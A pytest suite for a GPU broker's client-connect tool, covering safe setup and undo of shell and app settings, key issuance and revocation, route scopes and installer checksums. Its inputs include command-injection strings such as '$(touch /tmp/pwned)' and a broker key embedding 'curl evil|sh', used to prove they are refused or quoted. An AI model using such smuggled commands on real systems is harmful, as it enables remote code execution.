"""Review round on connect (PR #16): one or more tests per finding.

1 unsafe URL/key/model refused everywhere, shell values single-quoted; 2 a reconnect over a
user's edits never restores the stale backup; 3 undo removes only our leaf keys; 4 the shell
block leaves ANTHROPIC_* and a real OPENAI_API_KEY alone; 5 client keys reach model routes
only, as themselves; 6 the manifest tracks every change as it happens; 7 a failed undo or
revoke keeps its record; 8 invites mint the key at redemption and the installer passes it on
stdin and checks the zipapp; 9 --only --revoke never cuts off other clients; 10 Open WebUI
disconnect removes only our entry. Smaller: fallback strips broker fields, last_used is
throttled, plain http to a public host warns."""
from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from gpu_broker.connect import CLIENTS, cli, edits, engine, shell
from gpu_broker.connect.core import FileChange, Plan, Target
from gpu_broker.keys import KeyStore
from gpu_broker.web import connect as web_connect
from gpu_broker.web.app import create_app
from tests.test_connect_cli import TOKEN as CLI_TOKEN
from tests.test_connect_cli import FakeBroker, FakeWebui, run
from tests.test_connect_clients import KEY, MODEL, URL, home, snapshot, target, without_state  # noqa: F401
from tests.test_connect_web import HI, MAIN, plain_broker, web  # noqa: F401

HOSTILE = ["$(touch /tmp/pwned)", "`id`", "a\nb", "it's", "a b", 'q"']
OWUI = ["--openwebui-url", "http://owui:3000", "--openwebui-token", "owui-admin"]


# ---- 1 ----------------------------------------------------------------------
@pytest.mark.parametrize("bad", HOSTILE)
def test_unsafe_values_are_refused_before_any_connector(home, bad):
    for args in ((URL + bad, KEY, MODEL), (URL, KEY + bad, MODEL), (URL, KEY, MODEL + bad)):
        with pytest.raises(ValueError):
            Target(*args, home)
    before = snapshot(home)
    rc, out = run(home, "connect", "--url", URL, "--key", "gbk_" + bad, "--model", "m")
    assert rc == 1 and "refused" in out[-1] and snapshot(home) == before
    rc, _ = run(home, "connect", "--url", URL + bad, "--key", KEY, "--model", "m")
    assert rc == 1 and snapshot(home) == before


def test_a_hostile_broker_key_is_refused_and_revoked(home):
    class Hostile(FakeBroker):
        def __call__(self, method, url, credential, body):
            r = super().__call__(method, url, credential, body)
            return {**r, "key": "gbk_$(curl evil|sh)"} if method == "POST" else r
    fb, before = Hostile(), snapshot(home)
    rc, _ = run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    assert rc == 1 and snapshot(home) == before
    assert ("DELETE", f"{URL}/v1/keys/k1", CLI_TOKEN, None) in fb.calls


@pytest.mark.parametrize("value", HOSTILE)
def test_shell_values_are_literal(tmp_path, value):
    rc = tmp_path / "rc"
    rc.write_text(shell._line("bash", "X", value) + "\n")
    r = subprocess.run(["sh", "-c", f'. "{rc}"; printf %s "$X"'], capture_output=True, text=True, cwd=tmp_path)
    assert r.stdout == value and not (tmp_path / "pwned").exists()
    fish = shell.quote("fish", value)
    assert fish.startswith("'") and fish.endswith("'") and "\\'" in fish if "'" in value else True
    if shutil.which("fish"):
        out = subprocess.run(["fish", "-c", f"set -gx X {fish}; printf %s $X"], capture_output=True, text=True)
        assert out.stdout == value


# ---- 2 ----------------------------------------------------------------------
def test_reconnect_after_a_user_edit_keeps_the_edit(home):
    engine.connect(home, [CLIENTS["shell"].plan(target(home)), CLIENTS["claude-code"].plan(target(home, claude_code="1"))])
    zsh, claude = home / ".zshrc", home / ".claude/settings.json"
    zsh.write_text(zsh.read_text() + "alias ll='ls -l'\n")
    data = json.loads(claude.read_text())
    data["theme"] = "dark"
    claude.write_text(json.dumps(data))
    other = Target(URL, "gbk_second", MODEL, home, {"SHELL": "/bin/zsh"}, {"claude_code": "1"})
    engine.connect(home, [CLIENTS["shell"].plan(other), CLIENTS["claude-code"].plan(other)])
    engine.disconnect(home)
    assert "alias ll='ls -l'" in zsh.read_text() and edits.BEGIN not in zsh.read_text()
    assert json.loads(claude.read_text()) == {"env": {"FOO": "1"}, "model": "opus", "theme": "dark"}


def test_a_file_deleted_between_connects_is_ours_and_goes_on_disconnect(home):
    engine.connect(home, [CLIENTS["shell"].plan(target(home))])
    (home / ".zshrc").unlink()
    engine.connect(home, [CLIENTS["shell"].plan(target(home))])
    engine.disconnect(home)
    assert not (home / ".zshrc").exists()


def test_an_undo_that_cannot_write_stays_recorded(home, monkeypatch):
    engine.connect(home, [CLIENTS["shell"].plan(target(home))])
    (home / ".zshrc").write_text((home / ".zshrc").read_text() + "# edited\n")   # forces the strip path

    def full_disk(*_a, **_k):
        raise OSError("No space left on device")
    monkeypatch.setattr(engine, "write", full_disk)
    report = engine.disconnect(home)
    assert any("could not be undone" in r for r in report) and str(home / ".zshrc") in engine.load_manifest(home)["files"]


# ---- 3 ----------------------------------------------------------------------
def test_undo_keeps_keys_the_user_added_to_objects_we_created():
    data: dict = {"other": 1}
    undo = edits.set_paths(data, {("env", "A"): "x", ("providers", "ours", "settings"): {"k": 1}})
    data["env"]["MINE"] = "keep"
    data["providers"]["theirs"] = {"settings": {}}
    assert edits.unset_paths(data, undo) == {"other": 1, "env": {"MINE": "keep"}, "providers": {"theirs": {"settings": {}}}}
    untouched: dict = {}
    assert edits.unset_paths(untouched, edits.set_paths(untouched, {("a", "b", "c"): 1, ("a", "d"): 2})) == {}
    theirs: dict = {"env": {}}   # an empty object the user had stays, even once our key is gone from it
    assert edits.unset_paths(theirs, edits.set_paths(theirs, {("env", "A"): 1})) == {"env": {}}


def test_claude_env_and_cline_providers_keep_later_user_keys(home):
    claude, cline = home / ".claude/settings.json", home / ".cline/data/settings/providers.json"
    claude.write_text('{"model": "opus"}\n')
    cline.write_text('{"version": 1}\n')
    engine.connect(home, [CLIENTS["claude-code"].plan(target(home, claude_code="1")), CLIENTS["cline"].plan(target(home))])
    c = json.loads(claude.read_text())
    c["env"]["MY_VAR"] = "1"
    claude.write_text(json.dumps(c))
    p = json.loads(cline.read_text())
    p["providers"]["anthropic"] = {"settings": {"provider": "anthropic"}, "updatedAt": "2026-01-01T00:00:00Z"}
    cline.write_text(json.dumps(p))
    engine.disconnect(home)
    assert json.loads(claude.read_text()) == {"model": "opus", "env": {"MY_VAR": "1"}}
    assert set(json.loads(cline.read_text())["providers"]) == {"anthropic"}


# ---- 4 ----------------------------------------------------------------------
def exported(plan: Plan) -> str:
    return plan.files[0].new.decode()


def test_shell_exports_anthropic_only_with_claude_code(home):
    plain = CLIENTS["shell"].plan(target(home))
    assert "ANTHROPIC" not in exported(plain) and any("--claude-code" in n for n in plain.notes)
    assert "ANTHROPIC_BASE_URL" in exported(CLIENTS["shell"].plan(target(home, claude_code="1")))
    assert plain.notes[0] == "exports GPU_BROKER_URL, GPU_BROKER_API_KEY, OPENAI_BASE_URL, OPENAI_API_BASE, OPENAI_API_KEY"


def test_shell_never_shadows_a_real_key(home):
    env = {"SHELL": "/bin/zsh", "OPENAI_API_KEY": "sk-real", "ANTHROPIC_API_KEY": "sk-ant-real"}
    p = CLIENTS["shell"].plan(Target(URL, KEY, MODEL, home, env, {"claude_code": "1"}))
    text = exported(p)
    assert "OPENAI" not in text and "ANTHROPIC" not in text and "GPU_BROKER_API_KEY" in text
    assert sum("already set" in n for n in p.notes) == 2
    ours = {"SHELL": "/bin/zsh", "OPENAI_API_KEY": "gbk_" + "A" * 43}   # our own earlier export is not "someone else's"
    assert "OPENAI_API_KEY" in exported(CLIENTS["shell"].plan(Target(URL, KEY, MODEL, home, ours)))
    same = {"SHELL": "/bin/zsh", "OPENAI_API_KEY": "custom-key"}   # a key given with --key, exported last time
    assert "OPENAI_API_KEY" in exported(CLIENTS["shell"].plan(Target(URL, "custom-key", MODEL, home, same)))


# ---- 5 ----------------------------------------------------------------------
PUBLIC = {"/health", "/dash", "/dash/{name}.js", "/connect.sh", "/connect/gpu-broker-connect.pyz"}
MODEL_ROUTES = {"/v1/chat/completions", "/v1/messages", "/v1/responses", "/v1/embeddings", "/v1/models", "/mcp",
                "/v1/upstreams/passthrough"}
ADMIN = {"/v1/admin/quiesce", "/v1/admin/resume", "/v1/admin/gpu-held/clear", "/v1/keys", "/v1/keys/{kid}",
         "/v1/connect/invite", "/v1/connect/clients", "/v1/connect/{name}", "/v1/disconnect/{name}"}
OPERATOR = {"/v1/jobs", "/v1/jobs/{jid}", "/v1/status", "/v1/events", "/v1/catalog", "/v1/sessions", "/v1/sessions/end",
            "/v1/gpu", "/v1/ui", "/v1/metrics", "/v1/stats", "/v1/upstreams"}


def routes(app) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []

    def walk(rs):
        for r in rs:
            if hasattr(r, "original_router"):   # FastAPI wraps included routers
                walk(r.original_router.routes)
            elif hasattr(r, "methods"):
                out.extend((m, r.path) for m in r.methods if m != "HEAD")
    walk(app.routes)
    return out


def test_every_route_has_the_scope_it_should(plain_broker):
    app = create_app(plain_broker, "main-token", start=False)
    table = routes(app)
    assert {p for _, p in table} == PUBLIC | MODEL_ROUTES | ADMIN | OPERATOR   # a new route must be classified here
    with TestClient(app) as c:
        key = c.post("/v1/keys", headers={"Authorization": "Bearer main-token"}, json={"name": "laptop"}).json()["key"]
        for method, path in table:
            url = path.replace("{name}", "x").replace("{kid}", "x").replace("{jid}", "x")
            kw = {"json": {}} if method in ("POST", "PUT") else {}
            as_key = c.request(method, url, headers={"Authorization": f"Bearer {key}"}, **kw).status_code
            as_x_main = c.request(method, url, headers={"x-api-key": "main-token"}, **kw).status_code
            if path in PUBLIC or path in MODEL_ROUTES:
                assert as_key not in (401, 403), (method, path)
            else:
                assert as_key == 403, (method, path)
            if path in ADMIN:
                assert as_x_main == 401, (method, path)
            elif path in OPERATOR:
                assert as_x_main not in (401, 403), (method, path)


def test_a_client_key_is_its_own_requester(web, plain_broker):
    key = web.post("/v1/keys", headers=MAIN, json={"name": "laptop"}).json()["key"]
    r = web.post("/v1/chat/completions", headers={"x-api-key": key, "x-requester": "someone-else"}, json=HI).json()
    assert plain_broker.store.job(r["x_broker"]["job"])["requester"] == "laptop"
    r = web.post("/v1/chat/completions", headers={**MAIN, "x-requester": "batch-tool"}, json=HI).json()
    assert plain_broker.store.job(r["x_broker"]["job"])["requester"] == "batch-tool"


# ---- 6 ----------------------------------------------------------------------
def test_a_run_that_fails_part_way_leaves_every_change_tracked(home):
    blocker = home / "blocker"
    blocker.write_text("a file where a directory should be")
    good = FileChange(home / ".zshrc", b"ours\n", {"kind": edits.BLOCK, "comment": "#"})
    bad = FileChange(blocker / "sub" / "x.json", b"{}", {"kind": edits.OWN_FILE})
    record = {"broker": URL, "id": "k9", "name": "laptop", "key": KEY}
    with pytest.raises(OSError):
        engine.connect(home, [Plan("shell", [good]), Plan("cline", [bad])], key=record)
    m = engine.load_manifest(home)
    assert m["key"] == record and str(home / ".zshrc") in m["files"]


def test_the_key_is_recorded_before_any_file_is_written(home, monkeypatch):
    seen = []
    real = engine.write
    manifest = home / engine.STATE_DIR / engine.MANIFEST

    def spy(p, *a, **k):
        if p != manifest:
            seen.append(engine.load_manifest(home).get("key"))
        return real(p, *a, **k)
    monkeypatch.setattr(engine, "write", spy)
    engine.connect(home, [CLIENTS["shell"].plan(target(home))], key={"broker": URL, "id": "k1", "name": "n", "key": KEY})
    assert seen and all(k and k["id"] == "k1" for k in seen)


# ---- 7, 9 -------------------------------------------------------------------
def test_a_failed_undo_stays_recorded_with_the_key(home):
    fb = FakeBroker()
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    cline = home / ".cline/data/settings/providers.json"
    cline.write_text("{ not json")
    _, out = run(home, "disconnect")
    m = engine.load_manifest(home)
    assert str(cline) in m["files"] and m["key"]["id"] == "k1" and any("still recorded" in o for o in out)
    assert engine.connected(home) == {"cline"}


def test_an_api_undo_that_fails_stays_recorded(home):
    run(home, "connect", "--url", URL, "--key", KEY, "--model", "m", "--only", "openwebui", *OWUI)

    def down(method, url, token, body):
        raise OSError("connection refused")
    _, out = run(home, "disconnect", *OWUI, webui=down)
    assert engine.connected(home) == {"openwebui"} and any("could not be undone" in o for o in out)


def test_revoke_without_a_token_changes_nothing(home):
    run(home, "connect", "--url", URL, call=FakeBroker(), env={"BROKER_TOKEN": CLI_TOKEN})
    before = snapshot(home)
    rc, out = run(home, "disconnect", "--revoke")
    assert rc == 1 and "nothing was changed" in out[0] and snapshot(home) == before


def test_a_failed_revoke_keeps_the_key_record(home):
    run(home, "connect", "--url", URL, call=FakeBroker(), env={"BROKER_TOKEN": CLI_TOKEN})

    def refuse(method, url, credential, body):
        raise OSError("broker down")
    rc, _ = run(home, "disconnect", "--revoke", call=refuse, env={"BROKER_TOKEN": CLI_TOKEN})
    assert rc == 1 and engine.load_manifest(home)["key"]["id"] == "k1"


def test_revoked_key_is_forgotten_and_reconnect_issues_a_new_one(home):
    fb = FakeBroker()
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    run(home, "disconnect", "--revoke", call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    assert "key" not in engine.load_manifest(home)
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    assert fb.issued == 2


def test_disconnect_without_revoke_keeps_the_key_for_reuse(home):
    fb = FakeBroker()
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    run(home, "disconnect")
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    assert fb.issued == 1


def test_only_with_revoke_refuses_while_others_share_the_key(home):
    fb = FakeBroker()
    run(home, "connect", "--url", URL, call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    before = snapshot(home)
    rc, out = run(home, "disconnect", "--only", "shell", "--revoke", call=fb, env={"BROKER_TOKEN": CLI_TOKEN})
    assert rc == 1 and "cline" in out[0] and snapshot(home) == before and not [c for c in fb.calls if c[0] == "DELETE"]
    rc, _ = run(home, "disconnect", "--only", ",".join(engine.connected(home)), "--revoke", call=fb,
                env={"BROKER_TOKEN": CLI_TOKEN})
    assert rc == 0 and ("DELETE", f"{URL}/v1/keys/k1", CLI_TOKEN, None) in fb.calls


# ---- 8 ----------------------------------------------------------------------
def invite_code(c, name="laptop"):
    r = c.post("/v1/connect/invite", headers=MAIN, json={"name": name})
    return r, r.json().get("command", "").split("invite=")[-1].split("'")[0]


def test_an_invite_mints_no_key_until_it_is_redeemed(web, monkeypatch):
    invite_code(web)
    assert web.get("/v1/keys", headers=MAIN).json() == []
    _, stale = invite_code(web)
    now = web_connect.time.monotonic()
    monkeypatch.setattr(web_connect.time, "monotonic", lambda: now + web_connect.INVITE_TTL_S + 1)
    assert web.get(f"/connect.sh?invite={stale}").status_code == 404
    assert web.get("/v1/keys", headers=MAIN).json() == []
    monkeypatch.undo()


def test_redeeming_issues_one_named_key(web):
    _, code = invite_code(web, "desk")
    script = web.get(f"/connect.sh?invite={code}").text
    keys = web.get("/v1/keys", headers=MAIN).json()
    assert [k["name"] for k in keys] == ["desk"] and "--key-stdin" in script and "--key '" not in script


def test_an_unsafe_model_makes_no_key(web, plain_broker, monkeypatch):
    monkeypatch.setattr(type(plain_broker.scheduler.pool), "resident", property(lambda _: "bad model$(x)"))
    r, _ = invite_code(web)
    assert r.status_code == 400 and web.get("/v1/keys", headers=MAIN).json() == []


def test_cli_reads_the_key_from_stdin(home, monkeypatch):
    monkeypatch.setattr(cli, "stdin", lambda: "gbk_from_stdin\n")
    run(home, "connect", "--url", URL, "--key-stdin", "--model", "m", "--only", "shell")
    assert "'gbk_from_stdin'" in (home / ".zshrc").read_text()


def fake_bin(tmp_path: Path, served: Path) -> dict[str, str]:
    """PATH with a `curl` that 'downloads' `served`, plus the real python3 and sh tools."""
    b = tmp_path / "bin"
    b.mkdir()
    curl = b / "curl"
    curl.write_text(f'#!/bin/sh\nwhile [ "$1" != "-o" ]; do shift; done\ncp "{served}" "$2"\n')
    curl.chmod(curl.stat().st_mode | stat.S_IEXEC)
    (b / "python3").symlink_to(sys.executable)
    return {"PATH": f"{b}:{os.environ['PATH']}"}


@pytest.mark.parametrize("tampered", [False, True])
def test_the_installer_checks_the_zipapp_and_passes_the_key_on_stdin(tmp_path, tampered):
    home = tmp_path / "home"
    home.mkdir()
    (home / ".zshrc").write_text("")
    served = tmp_path / "served.pyz"
    data = web_connect.pyz()
    served.write_bytes(data + (b"x" if tampered else b""))
    script = web_connect.installer("http://gpu-host:8095", "gbk_viastdin", "llama-8b")
    env = {**fake_bin(tmp_path, served), "HOME": str(home), "SHELL": "/bin/zsh"}
    r = subprocess.run(["sh", "-s", "--", "--only", "shell"], input=script, capture_output=True, text=True, env=env, timeout=60)
    if tampered:
        assert r.returncode == 1 and "checksum" in r.stderr and "gbk_viastdin" not in (home / ".zshrc").read_text()
    else:
        assert r.returncode == 0, r.stderr
        assert "'gbk_viastdin'" in (home / ".zshrc").read_text()


def test_the_zipapp_is_the_same_bytes_every_time(monkeypatch):
    first = web_connect.pyz()
    monkeypatch.setattr("time.time", lambda: 2_000_000_000.0)   # a later clock must not change the bytes
    assert web_connect.pyz() == first


def test_an_unsafe_url_is_refused_by_every_command(home):
    for cmd in ("clients", "disconnect"):
        rc, out = run(home, cmd, "--url", "http://gpu$(id):8095")
        assert rc == 1 and "refused" in out[-1]


@pytest.mark.parametrize(("url", "warns"), [("http://gpu.example.com:8095", True), ("http://8.8.8.8", True),
                                            ("https://gpu.example.com", False), ("http://192.168.1.5:8095", False),
                                            ("http://127.0.0.1:8095", False), ("http://gpu-host:8095", False),
                                            ("http://gpu.local", False), ("http://[fe80::1]:8095", False)])
def test_plain_http_to_a_public_host_warns(url, warns):
    assert ("travels unencrypted" in web_connect.installer(url, KEY, MODEL)) is warns


# ---- 10 ---------------------------------------------------------------------
def test_openwebui_disconnect_removes_only_our_entry(home):
    ui = FakeWebui()
    run(home, "connect", "--url", URL, "--key", KEY, "--model", "m", "--only", "openwebui", *OWUI, webui=ui)
    cfg = ui.config   # an admin adds another connection afterwards
    cfg["OPENAI_API_BASE_URLS"].append("http://ollama:11434/v1")
    cfg["OPENAI_API_KEYS"].append("ollama-key")
    cfg["OPENAI_API_CONFIGS"]["2"] = {"enable": True, "name": "ollama"}
    manifest = (home / engine.STATE_DIR / engine.MANIFEST).read_text()
    assert "sk-real" not in manifest and "OPENAI_API_KEYS" not in manifest
    run(home, "disconnect", *OWUI, webui=ui)
    assert ui.config["OPENAI_API_BASE_URLS"] == ["https://api.openai.com/v1", "http://ollama:11434/v1"]
    assert ui.config["OPENAI_API_KEYS"] == ["sk-real", "ollama-key"]
    assert ui.config["OPENAI_API_CONFIGS"] == {"0": {"enable": True}, "1": {"enable": True, "name": "ollama"}}


def test_openwebui_connection_that_existed_before_is_left_in_place(home):
    ui = FakeWebui()
    ui.config["OPENAI_API_BASE_URLS"].append(f"{URL}/v1")
    ui.config["OPENAI_API_KEYS"].append("users-own")
    run(home, "connect", "--url", URL, "--key", KEY, "--model", "m", "--only", "openwebui", *OWUI, webui=ui)
    posts = len(ui.posts)
    run(home, "disconnect", *OWUI, webui=ui)
    assert len(ui.posts) == posts and f"{URL}/v1" in ui.config["OPENAI_API_BASE_URLS"]


# ---- smaller ------------------------------------------------------------------
def test_last_used_is_written_at_most_once_a_minute(tmp_path):
    now = [1000.0]
    ks = KeyStore(str(tmp_path / "k.db"), clock=lambda: now[0])
    k = ks.issue("laptop")
    assert ks.check(k["key"]) == "laptop" and ks.list()[0]["last_used"] == 1000.0
    now[0] = 1059.0
    ks.check(k["key"])
    assert ks.list()[0]["last_used"] == 1000.0
    now[0] = 1060.0
    ks.check(k["key"])
    assert ks.list()[0]["last_used"] == 1060.0


def test_disconnect_reports_what_it_removed(home):
    engine.connect(home, [CLIENTS["shell"].plan(target(home))])
    report = engine.disconnect(home)
    assert all("restored" in line for line in report) and without_state(snapshot(home))
